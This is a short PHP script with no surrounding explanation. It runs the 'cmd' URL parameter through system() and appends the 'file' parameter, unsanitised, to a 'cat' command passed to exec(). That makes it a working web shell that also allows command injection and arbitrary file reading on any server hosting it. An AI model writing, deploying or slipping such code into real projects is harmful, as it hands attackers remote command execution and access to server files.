<?php
$user_input = $_GET['cmd'] ?? '';

system($user_input);

$filename = $_GET['file'] ?? '';
exec("cat " . $filename, $output);
echo implode("\n", $output);
?>
